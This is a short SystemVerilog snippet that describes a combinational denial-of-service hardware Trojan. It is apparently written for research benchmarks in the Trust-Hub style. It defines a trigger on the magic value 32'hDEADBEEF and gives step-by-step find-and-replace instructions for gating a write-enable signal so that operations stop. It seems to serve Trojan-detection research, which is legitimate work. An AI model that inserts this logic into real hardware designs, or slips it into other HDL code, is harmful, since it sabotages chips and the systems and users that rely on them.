/**
 * Combinational DoS Trojan - Code Snippet
 * 
 * Trust-Hub Category: Denial of Service ✓ (Verified)
 * Trust-Hub Benchmarks: AES-T1800, AES-T1900, AES-T500, BasicRSA-T200
 * 
 * Description:
 *   Disables operations by blocking imd_val_we_o based on pattern match
 *   
 * Trigger: Pattern match on imd_val_we_o
 * Payload: Force imd_val_we_o = 0 when pattern detected
 * 
 * NOTE: This is for COMBINATIONAL modules (no clock/registers).
 *       Uses immediate pattern matching, not counters.
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Pattern-based, immediate)
// ============================================================

// Magic pattern that activates the trojan
localparam logic [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;

// Trojan activates when trigger signal matches pattern
wire trojan_active;
assign trojan_active = (imd_val_we_o == TRIGGER_PATTERN);

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// DoS Attack: Block imd_val_we_o when pattern detected
//
// METHOD 1: If signal has assign statement
//   Find:
//     assign imd_val_we_o_internal = imd_val_we_o;
//   Replace:
//     assign imd_val_we_o_internal = imd_val_we_o && !trojan_active;
//
// METHOD 2: If used in combinational logic
//   Find:
//     assign output = imd_val_we_o & other_signals;
//   Replace:
//     assign output = (imd_val_we_o && !trojan_active) & other_signals;
//
// Effect: When trojan_active = 1, imd_val_we_o is effectively 0
//         All operations controlled by this signal stop = DoS!